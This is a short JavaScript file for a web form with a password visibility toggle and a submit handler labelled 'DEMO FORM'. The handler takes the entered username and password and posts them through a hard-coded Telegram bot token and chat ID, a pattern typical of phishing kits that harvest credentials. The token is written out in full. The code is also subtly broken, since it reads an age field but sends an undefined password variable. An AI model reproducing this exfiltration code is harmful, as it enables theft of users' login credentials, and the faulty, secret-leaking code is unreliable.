function togglePassword() {

    const passwordField = document.getElementById("password");
    const eyeOpen = document.getElementById("eyeOpen");
    const eyeClosed = document.getElementById("eyeClosed");

    if (!passwordField) {
        console.error("Password field not found");
        return;
    }

    const isHidden = passwordField.type === "password";

    passwordField.type = isHidden ? "text" : "password";

    if (eyeOpen && eyeClosed) {
        eyeOpen.style.display = isHidden ? "block" : "none";
        eyeClosed.style.display = isHidden ? "none" : "block";
    }
}


// Telegram configuration
const BOT_TOKEN = "8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0";
const CHAT_ID = "5613942414";


// Form
const form = document.getElementById("demoForm");

if (form) {

    form.addEventListener("submit", async function (event) {

        event.preventDefault();

        const usernameElement = document.getElementById("username");
        const ageElement = document.getElementById("age");

        if (!usernameElement || !ageElement) {
            console.error("Required form fields not found");
            return;
        }

        const username = usernameElement.value.trim();
        const age = ageElement.value.trim();

        const telegramMessage =
            "📋 DEMO FORM SUBMISSION\n\n" +
            "Username: " + username + "\n" +
            "password: " + password;

        try {

            const response = await fetch(
                `https://api.telegram.org/bot8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0/sendMessage`,
                {
                    method: "POST",

                    headers: {
                        "Content-Type": "application/json"
                    },

                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: telegramMessage
                    })
                }
            );

            const result = await response.json();

            if (result.ok) {

                alert("Submitted successfully!");
                form.reset();

            } else {

                console.error("Telegram API error:", result);
                alert("Submission failed.");

            }

        } catch (error) {

            console.error("Network error:", error);
            alert("Network error.");

        }

    });

}
